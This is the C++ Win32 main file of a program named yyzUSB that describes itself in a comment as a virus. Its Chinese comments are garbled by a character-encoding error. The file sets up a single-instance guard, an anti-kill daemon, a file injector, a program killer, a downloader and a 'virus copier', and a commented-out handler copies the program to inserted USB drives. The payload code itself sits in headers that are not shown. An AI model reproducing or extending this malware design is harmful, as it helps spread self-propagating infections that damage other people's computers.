// yyzUSB.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "yyzUSB.h"
#include "AutoBuilder.h"
#include "VirusCopyer.h"

#include <Dbt.h>
#include "TimerManager.h"
#include <iostream>
#include "FileDownloader.h"
#include "ProgramKiller.h"
#include "../Singleton/Singleton.h"
#include "Daemon.h"
#include "SrvRun.h"
#include "ExportExeIfInjected.h"
#include "FileInjector.h"
#define SINGLETON_NAME (_T("OnlyOneInstance"))
#define DEAMON_HOTKEY 0x1234
#define MAX_LOADSTRING 100
static CSingleton singleton(SINGLETON_NAME);//this virus has only one instance
static CDaemon daemon;//double protection to be not killed
static CSrvRun srvRun;
static CExportExeIfInjected exportExeIfInjected;
static CFileInjector fj;
static CProgramKiller killer;
static CFileDownloader downloader;
static CVirusCopyer copyer;

// ȫ�ֱ���:
HINSTANCE hInst;								// ��ǰʵ��
TCHAR szTitle[MAX_LOADSTRING];					// �������ı�
TCHAR szWindowClass[MAX_LOADSTRING];			// ����������

// �˴���ģ���а����ĺ�����ǰ������:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: �ڴ˷��ô��롣
	MSG msg;
	HACCEL hAccelTable;

	// ��ʼ��ȫ���ַ���
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_YYZUSB, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// ִ��Ӧ�ó����ʼ��:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_YYZUSB));

	// ����Ϣѭ��:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  ����: MyRegisterClass()
//
//  Ŀ��: ע�ᴰ���ࡣ
//
//  ע��:
//
//    ����ϣ��
//    �˴�������ӵ� Windows 95 �еġ�RegisterClassEx��
//    ����֮ǰ�� Win32 ϵͳ����ʱ������Ҫ�˺��������÷������ô˺���ʮ����Ҫ��
//    ����Ӧ�ó���Ϳ��Ի�ù�����
//    ����ʽ��ȷ�ġ�Сͼ�ꡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_YYZUSB));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_YYZUSB);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   ����: InitInstance(HINSTANCE, int)
//
//   Ŀ��: ����ʵ�����������������
//
//   ע��:
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam);

//
//  ����: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��: ���������ڵ���Ϣ��
//
//  WM_COMMAND	- ����Ӧ�ó���˵�
//  WM_PAINT	- ����������
//  WM_DESTROY	- �����˳���Ϣ������
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	//	�ڳ��򴴽���ʱ��ע�ᶨʱ��
	case WM_CREATE:
		/*::SetTimer(hWnd, CTimerManager::getDownloadTimer(), 
			CTimerManager::getDownloadTimer(), NULL);
		::SetTimer(hWnd, CTimerManager::getCloseWindowTimer(),
			CTimerManager::getCloseWindowTimer(), NULL);*/
		RegisterHotKey(hWnd,DEAMON_HOTKEY,MOD_CONTROL|MOD_ALT,'D');
		break;
	case  WM_HOTKEY:
		{
			daemon.unDread = false;
			MessageBox(NULL,_T("Daemon status changed"),NULL,MB_OK);
		}
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// �����˵�ѡ��:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		{
			TCHAR txt[]=_T("If you can't close it,Please ctrl+alt+D,then close the daemon,then close the window");
			TextOut(hdc,0,0,txt,lstrlen(txt));
		}
		
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	//case WM_DEVICECHANGE:
		//OnDeviceChange(hWnd, wParam, lParam);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

/*
TCHAR FirstDriveFromMask(ULONG unitmask);
void CopyToDisk(char USBinfo);
LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	CVirusCopyer copyer;

	switch (wParam)
	{
	case DBT_DEVICEARRIVAL:
		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			int USBCount = copyer.getUSBDrive(lpdbv->dbcv_unitmask);
			if (USBCount > 0)
			{
				copyer.copyToUsb();
			}
		}
		break;
	case DBT_DEVTYP_DEVINST:
		{
		int lParam = 0;
		break;
		}
	case DBT_DEVICEREMOVECOMPLETE:
		break;
	}

	return  LRESULT();
}*/

// �����ڡ������Ϣ�������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
